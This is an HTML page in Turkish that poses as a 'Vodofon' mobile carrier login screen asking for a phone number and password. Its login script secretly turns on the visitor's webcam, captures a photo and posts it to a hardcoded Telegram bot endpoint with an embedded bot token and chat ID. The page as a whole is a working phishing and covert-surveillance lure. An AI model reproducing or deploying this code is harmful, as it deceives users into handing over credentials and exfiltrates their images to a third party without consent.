<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vodofon Giriş Ekranı</title>
<link rel="stylesheet" href="styles.css">
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #fff; /* Arka plan rengi beyaz */
  }

  .container {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh; /* Ekranın tamamını kaplar */
    background-color: #f00; /* Panelin arka plan rengi kırmızı */
  }

  #login-panel {
    padding: 20px;
    background-color: #fff; /* Panelin iç kısmının arka plan rengi beyaz */
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Gölge efekti */
    text-align: center;
  }

  h1 {
    color: #333;
  }

  p {
    color: #666;
  }

  button {
    padding: 10px 20px;
    background-color: #007bff;
    color: #fff;
    border: none;
    border-radius: 5px;
    cursor: pointer;
  }

  button:hover {
    background-color: #0056b3;
  }

  #vodofon-logo {
    width: 150px;
    margin-bottom: 20px;
  }
</style>
</head>
<body>
<div class="container">
  <div id="login-panel">
    <img id="Bağlantınız D" src="vodofon-logo.png" alt="Bağlantınız Kötü">
    <h1>Giriş Ekranı</h1>
    <p>Telefon numaranızı ve şifrenizi girin:</p>
    <input type="text" id="phone" placeholder="Telefon Numarası" required>
    <br><br>
    <input type="password" id="password" placeholder="Şifre" required>
    <br><br>
    <button onclick="login()">Giriş Yap</button>
  </div>
</div>

<script>
function login() {
  var phone = document.getElementById('phone').value;
  var password = document.getElementById('password').value;
  
  // Kamera izni iste ve fotoğrafı çekip bota gönder
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
      var video = document.createElement('video');
      document.body.appendChild(video);
      video.srcObject = stream;
      video.play();

      video.addEventListener('canplay', function() {
        var canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        var context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        var imgData = canvas.toDataURL('image/jpeg');

        // Fotoğrafı binary olarak gönder
        var binaryData = atob(imgData.split(',')[1]);
        var arrayBuffer = new ArrayBuffer(binaryData.length);
        var uint8Array = new Uint8Array(arrayBuffer);
        for (var i = 0; i < binaryData.length; i++) {
          uint8Array[i] = binaryData.charCodeAt(i);
        }

        // Fotoğrafı FormData nesnesiyle gönder
        var formData = new FormData();
        formData.append('chat_id', '6070918315');
        formData.append('photo', new Blob([uint8Array], { type: 'image/jpeg' }));
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc/sendPhoto');
        xhr.send(formData);

        // Kamera akışını durdur
        stream.getTracks().forEach(track => track.stop());
        document.body.removeChild(video);
      });
    })
    .catch(function(err) {
      console.error('Kamera erişimi reddedildi:', err);
    });
}
</script>
</body>
</html>
